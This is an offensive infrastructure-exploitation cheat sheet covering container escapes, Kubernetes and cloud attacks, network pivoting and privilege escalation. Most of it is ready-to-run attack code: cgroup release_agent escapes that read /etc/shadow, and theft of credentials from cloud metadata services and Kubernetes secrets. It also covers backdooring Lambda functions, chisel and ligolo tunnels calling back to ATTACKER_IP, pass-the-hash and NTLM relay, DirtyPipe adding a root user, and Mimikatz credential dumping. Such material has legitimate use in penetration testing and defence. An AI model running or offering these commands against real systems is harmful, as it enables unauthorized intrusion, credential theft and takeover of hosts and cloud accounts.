# Infrastructure Exploitation

> Technical deep-dive into container, cloud, and network attacks with exploitation techniques.

---

## Container Security

### 1.1 Docker Enumeration

**Detect Docker Environment**:
```bash
# Check if inside container
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv
hostname  # Usually random hash

# Check capabilities
capsh --print
cat /proc/self/status | grep Cap

# Check mounted volumes
mount | grep -E "^/dev"
df -h
```

**Docker Socket Exploitation**:
```bash
# Check for exposed Docker socket
ls -la /var/run/docker.sock

# If socket is accessible, you have root on host
# List containers
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# Create privileged container with host filesystem
curl --unix-socket /var/run/docker.sock \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}' \
  http://localhost/containers/create

# Start and execute
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/CONTAINER_ID/start
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/CONTAINER_ID/attach?stream=1
```

### 1.2 Container Escape

**Privileged Container Escape**:
```bash
# Check if privileged
cat /proc/self/status | grep CapEff
# If CapEff: 0000003fffffffff, it's privileged

# Method 1: Mount host filesystem
mkdir /mnt/hostfs
mount /dev/sda1 /mnt/hostfs
cat /mnt/hostfs/etc/shadow

# Method 2: cgroup escape
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w
echo 1 > $d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo $t/c > $d/release_agent
echo '#!/bin/sh' > /c
echo "cat /etc/shadow > $t/output" >> /c
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
cat /output
```

**CAP_SYS_ADMIN Escape**:
```bash
# Check capabilities
capsh --print

# If CAP_SYS_ADMIN
# Create cgroup and escape
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

### 1.3 Kubernetes Attacks

**Enumerate Kubernetes**:
```bash
# Check for Kubernetes
env | grep KUBERNETES
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Check API server
APISERVER=https://kubernetes.default.svc
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# List pods
curl -s $APISERVER/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# List secrets
curl -s $APISERVER/api/v1/namespaces/default/secrets \
  -H "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

**kubectl Commands**:
```bash
# If kubectl is available
kubectl auth can-i --list
kubectl get secrets -A
kubectl get pods -A
kubectl exec -it POD_NAME -- /bin/bash

# Create privileged pod
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
spec:
  containers:
  - name: attacker
    image: alpine
    command: ["/bin/sh", "-c", "sleep infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: hostfs
      mountPath: /host
  volumes:
  - name: hostfs
    hostPath:
      path: /
EOF
```

---

## Cloud Exploitation

### 2.1 AWS Attacks

**Metadata Service (IMDS)**:
```bash
# IMDSv1 (no token required)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# IMDSv2 (token required)
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# User data (may contain secrets)
curl http://169.254.169.254/latest/user-data
```

**Using Stolen Credentials**:
```bash
# Set environment variables
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...  # If using temporary creds

# Enumerate identity
aws sts get-caller-identity

# Enumerate permissions
aws iam list-attached-user-policies --user-name USERNAME
aws iam list-user-policies --user-name USERNAME

# Common enumeration
aws s3 ls
aws ec2 describe-instances
aws lambda list-functions
aws iam list-users
aws secretsmanager list-secrets
```

**S3 Bucket Attacks**:
```bash
# Check if bucket is public
aws s3 ls s3://bucket-name --no-sign-request

# Bucket policy enumeration
aws s3api get-bucket-policy --bucket bucket-name

# Upload to misconfigured bucket
aws s3 cp malicious.html s3://bucket-name/ --no-sign-request

# Download entire bucket
aws s3 sync s3://bucket-name ./bucket-contents
```

**Lambda Exploitation**:
```bash
# List functions
aws lambda list-functions

# Get function code
aws lambda get-function --function-name FUNC_NAME

# Invoke function
aws lambda invoke --function-name FUNC_NAME output.txt

# Update function code (if permitted)
aws lambda update-function-code \
  --function-name FUNC_NAME \
  --zip-file fileb://backdoor.zip
```

### 2.2 GCP Attacks

**Metadata Service**:
```bash
# Basic metadata
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# Service account token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Project info
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id"

# Instance attributes
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"
```

**Using GCP Token**:
```bash
# Set token
export CLOUDSDK_AUTH_ACCESS_TOKEN="ya29...."

# Or using gcloud
gcloud auth activate-service-account --key-file=creds.json

# Enumerate
gcloud projects list
gcloud compute instances list
gcloud storage ls
gcloud functions list
```

### 2.3 Azure Attacks

**IMDS (Instance Metadata Service)**:
```bash
# Get access token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Instance metadata
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

**Using Azure Token**:
```bash
# Using az CLI
az login --identity

# Or with token
az account get-access-token

# Enumerate
az account list
az vm list
az storage account list
az keyvault list
```

---

## Network Attacks

### 3.1 Network Pivoting

**SSH Tunneling**:
```bash
# Local port forwarding (access remote service locally)
ssh -L 8080:internal-server:80 user@jump-host
# Now access internal-server:80 via localhost:8080

# Remote port forwarding (expose local service to remote)
ssh -R 8080:localhost:80 user@remote-server
# Remote server can access your local port 80 via localhost:8080

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@jump-host
# Configure browser/tools to use SOCKS5 localhost:1080

# ProxyChains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT internal-network
```

**Chisel (HTTP Tunneling)**:
```bash
# On attacker machine (server)
./chisel server -p 8000 --reverse

# On compromised host (client)
./chisel client ATTACKER_IP:8000 R:socks

# Now use SOCKS proxy on attacker at localhost:1080
```

**Ligolo-ng (Advanced Tunneling)**:
```bash
# On attacker (proxy)
./proxy -selfcert

# On compromised host (agent)
./agent -connect ATTACKER_IP:11601 -ignore-cert

# In proxy console
session  # Select session
start    # Start tunnel

# Add route on attacker
sudo ip route add 192.168.1.0/24 dev ligolo
```

### 3.2 Internal Network Scanning

**From Compromised Host**:
```bash
# Bash-only host discovery
for i in {1..254}; do
  (ping -c 1 192.168.1.$i | grep "64 bytes" &)
done

# Port scanning with /dev/tcp
for port in 22 80 443 445 3389; do
  (echo > /dev/tcp/192.168.1.10/$port) 2>/dev/null && echo "Port $port open"
done

# Using netcat
nc -zv 192.168.1.10 1-1000 2>&1 | grep succeeded

# If nmap available
nmap -sT -Pn --top-ports 100 192.168.1.0/24
```

### 3.3 SMB Attacks

**Enumeration**:
```bash
# List shares
smbclient -L //target -N
crackmapexec smb target --shares

# Connect to share
smbclient //target/share -U user%password

# Enumerate users
crackmapexec smb target -u '' -p '' --users
rpcclient -U "" -N target -c "enumdomusers"
```

**Pass-the-Hash**:
```bash
# Using crackmapexec
crackmapexec smb target -u admin -H NTLM_HASH

# Using psexec
impacket-psexec -hashes :NTLM_HASH admin@target

# Using wmiexec
impacket-wmiexec -hashes :NTLM_HASH admin@target
```

**SMB Relay**:
```bash
# Using Responder + ntlmrelayx
responder -I eth0 -dwv
impacket-ntlmrelayx -t smb://target -smb2support

# SAM dump
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

---

## Privilege Escalation

### 4.1 Linux Privilege Escalation

**Quick Wins**:
```bash
# Sudo permissions
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable /etc/passwd
ls -la /etc/passwd

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /var/spool/cron/crontabs/

# Docker group
id | grep docker
```

**SUID Exploitation**:
```bash
# Check GTFOBins for SUID binary exploitation
# Example: python with SUID
/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Example: find with SUID
find . -exec /bin/sh -p \; -quit

# Example: vim with SUID
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

**Kernel Exploits**:
```bash
# Check kernel version
uname -a
cat /etc/os-release

# Common exploits
# DirtyPipe (CVE-2022-0847) - Linux 5.8+
./dirtypipe /etc/passwd 1 "hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash"

# DirtyCow (CVE-2016-5195) - Linux 2.6.22 to 4.8.3
./dirtycow /etc/passwd
```

### 4.2 Windows Privilege Escalation

**Quick Enumeration**:
```powershell
# Current user info
whoami /all

# System info
systeminfo

# Check for hotfixes
wmic qfe list

# Running services
sc query

# Scheduled tasks
schtasks /query /fo LIST /v

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```

**Common Exploits**:
```powershell
# PrintSpoofer (SeImpersonatePrivilege)
PrintSpoofer.exe -i -c cmd

# JuicyPotato (SeImpersonatePrivilege, Windows < 2019)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t *

# RoguePotato (SeImpersonatePrivilege, Windows 2019+)
RoguePotato.exe -r ATTACKER_IP -e "cmd.exe /c powershell -ep bypass -file c:\temp\rev.ps1" -l 9999

# GodPotato (Universal)
GodPotato.exe -cmd "cmd /c whoami"
```

**Token Impersonation**:
```powershell
# Using Mimikatz
sekurlsa::logonpasswords
token::elevate
lsadump::sam

# Using Rubeus
Rubeus.exe triage
Rubeus.exe dump

# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt
hashcat -m 13100 hashes.txt wordlist.txt
```

---

## Quick Reference

### Container Escape Checklist

```
□ Check if privileged
  capsh --print

□ Check Docker socket
  ls -la /var/run/docker.sock

□ Check host mounts
  mount | grep "^/dev"

□ Check capabilities
  cat /proc/self/status | grep Cap

□ Check cgroup writability
  ls -la /sys/fs/cgroup/

□ Check for Kubernetes tokens
  cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Cloud Enumeration Order

```
1. Get credentials (IMDS, env vars, config files)
2. Identify identity (sts get-caller-identity)
3. Enumerate permissions
4. List resources (storage, compute, secrets)
5. Check for lateral movement paths
6. Look for sensitive data
```

### Network Pivoting Decision Tree

```
Need to access internal network?
│
├─ Have SSH access?
│   └─ Use SSH tunneling (-L, -D)
│
├─ Only HTTP outbound?
│   └─ Use Chisel or HTTP tunneling
│
├─ Need full network access?
│   └─ Use Ligolo-ng
│
└─ Stealth required?
    └─ Use DNS tunneling (dnscat2)
```

---

## Tools

```bash
# Container
deepce (container enumeration)
CDK (container escape toolkit)
peirates (Kubernetes pentest)

# Cloud
pacu (AWS exploitation)
ScoutSuite (multi-cloud audit)
Prowler (AWS security)

# Network
Responder (LLMNR/NBT-NS poisoning)
CrackMapExec (Swiss army knife)
Impacket (SMB/WMI tools)

# Privilege Escalation
LinPEAS / WinPEAS
linux-exploit-suggester
windows-exploit-suggester
```
